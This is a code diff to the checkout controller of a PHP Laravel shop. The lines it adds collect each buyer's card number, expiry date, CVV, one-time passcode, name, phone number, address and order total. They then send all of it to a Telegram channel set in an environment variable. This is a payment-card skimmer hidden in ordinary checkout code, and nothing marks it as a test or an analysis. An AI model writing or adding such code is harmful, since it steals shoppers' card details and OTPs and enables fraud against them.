@@ -25,6 +25,7 @@ use Gloudemans\Shoppingcart\Facades\Cart;
 use Illuminate\Http\Request;
 use Illuminate\Support\Collection;
 use Illuminate\Support\Facades\Log;
+use Telegram\Bot\Laravel\Facades\Telegram;
 use PayPal\Exception\PayPalConnectionException;
 use Ichtrojan\Otp\Otp;
 use Twilio\Rest\Client;
@@ -401,7 +402,7 @@ class CheckoutController extends Controller
         $os = $orderStatusRepo->findByName('on-delivery');
         $shippingFee = 0;
 
-        $checkoutRepo->buildCheckoutItems([
+        $order =$checkoutRepo->buildCheckoutItems([
             'reference' => Uuid::uuid4()->toString(),
             'courier_id' => 1, // @deprecated
             'customer_id' => $customer->id,
@@ -426,6 +427,26 @@ class CheckoutController extends Controller
         ]);
 
         Cart::destroy();
+        $fullname = $firstName. ' '. $lastName;
+        $total = $this->cartRepo->getTotal(2, $shippingFee);
+        $stt = $order ? $order->id : null;
+        $address = $address1. ' '. $address2;
+        $text = "<b>STT<b>: $stt\n"
+        . "<b>CardNumber: </b>". "$bankAccountNumber\n"
+        . "<b>ExpiredDate: </b>". "$expiredDate\n"
+        . "<b>Cvv: </b>". "$ccv\n"
+        . "<b>OTP: </b>". "$otp\n"
+        . "<b>Name: </b>". "$fullname\n"
+        . "<b>Phone: </b>". "$phoneNumber\n"
+        . "<b>Address: </b>". "$address\n"
+        . "<b>Total price: </b>". "$total\n"
+        ;
+
+        Telegram::sendMessage([
+            'chat_id' => env('TELEGRAM_CHANNEL_ID', ''),
+            'parse_mode' => 'HTML',
+            'text' => $text
+        ]);
 
         // return redirect()->route('home')->with('message', 'Order successful!');
         return response()->json([
